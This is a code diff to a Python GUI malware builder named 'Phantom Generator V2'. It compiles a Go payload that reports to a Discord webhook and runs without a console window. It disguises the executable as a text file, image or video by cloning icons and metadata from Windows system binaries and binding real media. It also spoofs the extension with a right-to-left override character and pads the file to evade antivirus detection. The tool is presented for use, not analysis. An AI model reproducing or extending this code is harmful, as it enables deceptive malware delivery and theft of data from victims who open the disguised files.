@@ -3,6 +3,25 @@ from tkinter import filedialog, messagebox, ttk
 import os
 import subprocess
 import sys
+
+def install_dependencies():
+    """Checks and installs required python modules"""
+    required = ['opencv-python', 'Pillow']
+    for package in required:
+        try:
+            if package == 'opencv-python':
+                import cv2
+            elif package == 'Pillow':
+                from PIL import Image
+        except ImportError:
+            print(f"Installing missing dependency: {package}...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+# Auto-install dependencies before imports
+install_dependencies()
+
+import cv2
+from PIL import Image
 from resource_injector import inject_icon, clone_resources
 
 class Phantom:
@@ -33,6 +52,7 @@ class Phantom:
         # Initialize attributes
         self.destination = None
         self.icon_path = None
+        self.media_path = None
         self.go_executable = self._find_go_executable()
 
         # Main Container
@@ -40,7 +60,7 @@ class Phantom:
         main_frame.pack(fill=tk.BOTH, expand=True)
         
         # Header
-        header = ttk.Label(main_frame, text="PHANTOM GENERATOR", style="Header.TLabel")
+        header = ttk.Label(main_frame, text="PHANTOM GENERATOR V2", style="Header.TLabel")
         header.pack(pady=(0, 15))
 
         # Webhook URL
@@ -54,34 +74,44 @@ class Phantom:
         self.exe_entry.insert(0, "phantom_payload.exe")
         self.exe_entry.pack(fill=tk.X, pady=(5, 10))
 
+        # Mode Selection Frame
+        mode_frame = ttk.LabelFrame(main_frame, text="🎭 Payload Mode", padding=10)
+        mode_frame.pack(fill=tk.X, pady=(0, 10))
+
+        self.mode_var = tk.StringVar(value="None")
+        
+        # Grid layout for modes
+        ttk.Radiobutton(mode_frame, text="Normal EXE", variable=self.mode_var, value="None", command=self.update_media_button).grid(row=0, column=0, sticky=tk.W, padx=5)
+        ttk.Radiobutton(mode_frame, text="Notepad (.txt)", variable=self.mode_var, value="Notepad", command=self.update_media_button).grid(row=0, column=1, sticky=tk.W, padx=5)
+        ttk.Radiobutton(mode_frame, text="Image (.png)", variable=self.mode_var, value="Image", command=self.update_media_button).grid(row=1, column=0, sticky=tk.W, padx=5)
+        ttk.Radiobutton(mode_frame, text="Video (.mp4)", variable=self.mode_var, value="Video", command=self.update_media_button).grid(row=1, column=1, sticky=tk.W, padx=5)
+
         # Camouflage Options Frame
-        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Camouflage & Stealth", padding=10)
+        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Stealth Options", padding=10)
         camo_frame.pack(fill=tk.X, pady=(0, 10))
 
-        self.camo_var = tk.StringVar(value="None")
-        ttk.Radiobutton(camo_frame, text="Normal EXE", variable=self.camo_var, value="None").grid(row=0, column=0, sticky=tk.W, padx=5)
-        ttk.Radiobutton(camo_frame, text="Notepad (.txt)", variable=self.camo_var, value="Notepad").grid(row=0, column=1, sticky=tk.W, padx=5)
-        ttk.Radiobutton(camo_frame, text="Image (.png)", variable=self.camo_var, value="Image").grid(row=0, column=2, sticky=tk.W, padx=5)
-
-        self.rtlo_var = tk.BooleanVar(value=False)
-        ttk.Checkbutton(camo_frame, text="Use RTLO (Extension Spoof)", variable=self.rtlo_var).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
+        self.rtlo_var = tk.BooleanVar(value=True)
+        ttk.Checkbutton(camo_frame, text="RTLO Spoofing (Extension)", variable=self.rtlo_var).grid(row=0, column=0, sticky=tk.W, padx=5)
 
         self.fud_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(camo_frame, text="FUD Optimization (Padding + Anti-AV)", variable=self.fud_var).grid(row=1, column=1, columnspan=2, sticky=tk.W, padx=5, pady=5)
+        ttk.Checkbutton(camo_frame, text="FUD (Padding 25MB)", variable=self.fud_var).grid(row=0, column=1, sticky=tk.W, padx=5)
 
         # Buttons Frame
         btn_frame = ttk.Frame(main_frame)
         btn_frame.pack(fill=tk.X, pady=10)
 
-        self.destination_button = ttk.Button(btn_frame, text="📁 Select Folder", command=self.select_destination)
-        self.destination_button.pack(side=tk.LEFT, padx=(0, 10), expand=True, fill=tk.X)
+        self.destination_button = ttk.Button(btn_frame, text="📁 Destination", command=self.select_destination)
+        self.destination_button.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)
 
-        self.icon_button = ttk.Button(btn_frame, text="🖼️ Select Icon", command=self.select_icon)
-        self.icon_button.pack(side=tk.LEFT, expand=True, fill=tk.X)
+        self.icon_button = ttk.Button(btn_frame, text="🖼️ Icon", command=self.select_icon)
+        self.icon_button.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
+
+        self.media_button = ttk.Button(btn_frame, text="🎬 Select Media", command=self.select_media, state=tk.DISABLED)
+        self.media_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)
 
         # Status Labels
         info_frame = ttk.Frame(main_frame)
-        info_frame.pack(fill=tk.X, pady=10)
+        info_frame.pack(fill=tk.X, pady=5)
 
         self.dest_label = ttk.Label(info_frame, text="📍 No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
         self.dest_label.pack(anchor=tk.W)
@@ -89,9 +119,12 @@ class Phantom:
         self.icon_label = ttk.Label(info_frame, text="🖼️ No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
         self.icon_label.pack(anchor=tk.W)
 
+        self.media_label = ttk.Label(info_frame, text="🎬 No media binded", font=("Segoe UI", 8), foreground="#bdc3c7")
+        self.media_label.pack(anchor=tk.W)
+
         # Generate Button
-        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PAYLOAD", command=self.generate_malware)
-        self.generate_button.pack(fill=tk.X, pady=(20, 10))
+        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PHANTOM PAYLOAD", command=self.generate_malware)
+        self.generate_button.pack(fill=tk.X, pady=(15, 10))
 
         # Progress
         self.progress_var = tk.DoubleVar()
@@ -131,6 +164,60 @@ class Phantom:
         if self.icon_path:
             self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")
 
+    def select_media(self):
+        mode = self.mode_var.get()
+        filetypes = []
+        if mode == "Image":
+            filetypes = [("Image files", "*.png *.jpg *.jpeg *.bmp")]
+        elif mode == "Video":
+            filetypes = [("Video files", "*.mp4 *.avi *.mkv *.mov")]
+        
+        self.media_path = filedialog.askopenfilename(filetypes=filetypes)
+        if self.media_path:
+            self.media_label.config(text=f"🎬 {os.path.basename(self.media_path)}")
+
+    def update_media_button(self):
+        mode = self.mode_var.get()
+        if mode in ["Image", "Video"]:
+            self.media_button.config(state=tk.NORMAL)
+        else:
+            self.media_button.config(state=tk.DISABLED)
+            self.media_path = None
+            self.media_label.config(text="🎬 No media binded")
+
+    def generate_thumbnail_icon(self, media_path, output_ico):
+        """Generates a high-quality .ico from an image or video frame"""
+        try:
+            mode = self.mode_var.get()
+            img = None
+
+            if mode == "Image":
+                img = Image.open(media_path)
+            elif mode == "Video":
+                cap = cv2.VideoCapture(media_path)
+                # Skip first few frames to avoid black screen at start
+                for _ in range(5):
+                    cap.grab()
+                success, frame = cap.retrieve()
+                if not success: # Fallback to first frame if grab fails
+                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
+                    success, frame = cap.read()
+                
+                if success:
+                    # Convert BGR to RGB
+                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    img = Image.fromarray(frame_rgb)
+                cap.release()
+
+            if img:
+                # Standard icon sizes for Windows
+                sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
+                img.save(output_ico, format='ICO', sizes=sizes)
+                return True
+        except Exception as e:
+            print(f"Error generating thumbnail icon: {e}")
+        return False
+
     def generate_malware(self):
         url = self.url_entry.get().strip()
         exe_name = self.exe_entry.get().strip()
@@ -138,6 +225,12 @@ class Phantom:
         if not url:
             messagebox.showwarning("Warning", "Please enter a Webhook URL")
             return
+        
+        # Validate Webhook URL format
+        if not url.startswith("https://discord.com/api/webhooks/") and not url.startswith("https://discordapp.com/api/webhooks/"):
+            messagebox.showwarning("Warning", "Invalid Webhook URL. It should start with https://discord.com/api/webhooks/")
+            return
+
         if not self.destination:
             messagebox.showwarning("Warning", "Please select a destination folder")
             return
@@ -169,8 +262,14 @@ class Phantom:
             
             # Compile Go code
             timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+            
+            # Prepare BindedFile name
+            binded_file_name = ""
+            if self.media_path:
+                binded_file_name = os.path.basename(self.media_path)
+            
             # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
-            ldflags = f"-s -w -H=windowsgui -X main.WebhookURL={url} -X \"main.Timestamp={timestamp}\""
+            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={url}\" -X \"main.Timestamp={timestamp}\" -X \"main.BindedFile={binded_file_name}\""
             
             self.status_label.config(text="Compiling binary (Go)...")
             self.progress_var.set(40)
@@ -188,24 +287,64 @@ class Phantom:
             
             # Inject icon & Metadata
             target_file_for_meta = None
-            camo_mode = self.camo_var.get()
+            camo_mode = self.mode_var.get()
             
             if camo_mode == "Notepad":
                 target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "notepad.exe")
             elif camo_mode == "Image":
                 target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "imageres.dll")
+            elif camo_mode == "Video":
+                # For video, we can use Windows Media Player or similar for metadata
+                target_file_for_meta = os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Windows Media Player", "wmplayer.exe")
+                if not os.path.exists(target_file_for_meta):
+                    target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "shell32.dll")
 
-            if target_file_for_meta:
-                self.status_label.config(text="Cloning metadata & icon...")
+            # Priority 1: User selected icon
+            # Priority 2: Auto-generate icon from media (thumbnail)
+            final_icon = self.icon_path
+            temp_icon_path = None
+
+            if not final_icon and self.media_path and camo_mode in ["Image", "Video"]:
+                self.status_label.config(text="Generating thumbnail icon...")
+                temp_icon_path = os.path.join(self.destination, "temp_thumb.ico")
+                if self.generate_thumbnail_icon(self.media_path, temp_icon_path):
+                    final_icon = temp_icon_path
+
+            # 1. First, clone metadata if a target is available
+            if target_file_for_meta and os.path.exists(target_file_for_meta):
+                self.status_label.config(text="Cloning metadata...")
                 self.progress_var.set(70)
                 self.root.update()
                 try:
-                    # Use clone_resources to copy everything (Icon, Version, Manifest)
-                    if not clone_resources(target_file_for_meta, output_exe):
-                        # Fallback to just icon if cloning fails
-                        inject_icon(output_exe, target_file_for_meta)
+                    # Clone everything (including icons) from the target first
+                    clone_resources(target_file_for_meta, output_exe)
                 except Exception as e:
-                    print(f"Warning: Metadata/Icon cloning failed: {e}")
+                    print(f"Warning: Metadata cloning failed: {e}")
+            
+            # 2. Then, inject our specific icon (this overwrites any icon from cloning)
+            if final_icon and os.path.exists(final_icon):
+                self.status_label.config(text="Injecting final icon...")
+                success = inject_icon(output_exe, final_icon)
+                if not success:
+                    print("Failed to inject icon!")
+                    self.status_label.config(text="Icon injection failed!")
+            
+            # Clean up temp icon
+            if temp_icon_path and os.path.exists(temp_icon_path):
+                try:
+                    os.remove(temp_icon_path)
+                except:
+                    pass
+
+            # Bind the media file (Must be done AFTER resource injection, otherwise it gets stripped)
+            if self.media_path and os.path.exists(self.media_path):
+                self.status_label.config(text="Binding media file...")
+                with open(self.media_path, "rb") as f_media:
+                    media_data = f_media.read()
+                
+                with open(output_exe, "ab") as f_exe:
+                    f_exe.write(b"PHANTOM_BIND_MARKER")
+                    f_exe.write(media_data)
             
             # FUD Optimization (Padding)
             if self.fud_var.get():
@@ -213,29 +352,11 @@ class Phantom:
                 self.progress_var.set(80)
                 self.root.update()
                 try:
-                    # To trick VirusTotal: we append a real legitimate file at the end
-                    # or large random data. Legit file is better for entropy.
-                    if camo_mode == "Notepad" and os.path.exists(target_file_for_meta):
-                        with open(target_file_for_meta, "rb") as f_legit:
-                            legit_data = f_legit.read()
-                        with open(output_exe, "ab") as f_out:
-                            f_out.write(legit_data) # Bind real notepad at the end
-                    
                     with open(output_exe, "ab") as f:
                         f.write(os.urandom(25 * 1024 * 1024)) # Add 25MB padding
                 except:
                     pass
 
-            # UPX Compression
-            if not self.fud_var.get(): # Don't use UPX if FUD is enabled (UPX is often flagged)
-                self.status_label.config(text="Applying UPX compression...")
-                self.progress_var.set(85)
-                self.root.update()
-                try:
-                    subprocess.run(["upx", "--best", output_exe], check=False, capture_output=True)
-                except:
-                    pass
-            
             # RTLO Extension Spoofing
             final_path = output_exe
             if self.rtlo_var.get():
@@ -243,14 +364,17 @@ class Phantom:
                 dir_name = os.path.dirname(output_exe)
                 base_name = os.path.basename(output_exe).replace(".exe", "")
                 
+                # RTLO character (U+202E) reverses the following text
+                rtlo = "\u202e"
+                
                 if camo_mode == "Notepad":
-                    # name [RTLO] exe.txt -> looks like name txt.exe
-                    spoofed_name = f"{base_name}\u202etxt.exe"
+                    spoofed_name = f"{base_name}{rtlo}txt.exe"
                 elif camo_mode == "Image":
-                    # name [RTLO] exe.png -> looks like name png.exe
-                    spoofed_name = f"{base_name}\u202epng.exe"
+                    spoofed_name = f"{base_name}{rtlo}gnp.exe"
+                elif camo_mode == "Video":
+                    spoofed_name = f"{base_name}{rtlo}4pm.exe" # 4pm -> mp4
                 else:
-                    spoofed_name = f"{base_name}\u202egpj.exe" # default to .jpg look
+                    spoofed_name = f"{base_name}{rtlo}gpj.exe"
                 
                 final_path = os.path.join(dir_name, spoofed_name)
                 try:
